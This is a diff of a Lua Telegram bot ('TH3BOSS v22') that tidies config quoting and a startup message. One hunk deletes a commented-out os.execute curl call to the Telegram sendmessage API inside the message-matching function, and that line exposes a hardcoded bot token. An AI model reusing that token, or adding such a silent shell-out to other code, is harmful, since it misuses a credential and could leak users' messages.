@@ -1,5 +1,4 @@
 
-
 sudouser = '@TH3BOSS'  -- خلي معرفك هنا
 SUDO = 60809019    -- حط ايديك هنا <===
 bot_name = "زعيم"
@@ -91,8 +90,9 @@ function create_config( )
     "tools",
     "zhrf",
     "replay",
+	
 	},
-    sudo_users = {{SUDO,'"'..sudouser..'"'}},
+    sudo_users = {{SUDO,sudouser}},
     admins = {},
     disabled_channels = {},
     moderation = {data = './data/moderation.json'},
@@ -139,7 +139,7 @@ function load_plugins()
 			print('\27[31m'..err..'\27[39m')
 		end
 	end
-	print('\n'..#config.enabled_plugins..' Plugins Are Active\n\nStarting TH3BOSS v22 Robot...\n')
+	print('\n'..#config.enabled_plugins..' Plugins Are Active\n\nStarting TH3BOSS V22 Robot...\n')
 end
 
 load_plugins()
@@ -161,7 +161,6 @@ end
 
 function match_pattern(pattern, text, lower_case)
 	if text then
-	-- os.execute('curl "https://api.telegram.org/bot471430290:AAEYUWamWQM4O72RL8l7bOq2pJlljt7uKdA/sendmessage" -F')
 
 		local matches = {}
 		if lower_case then
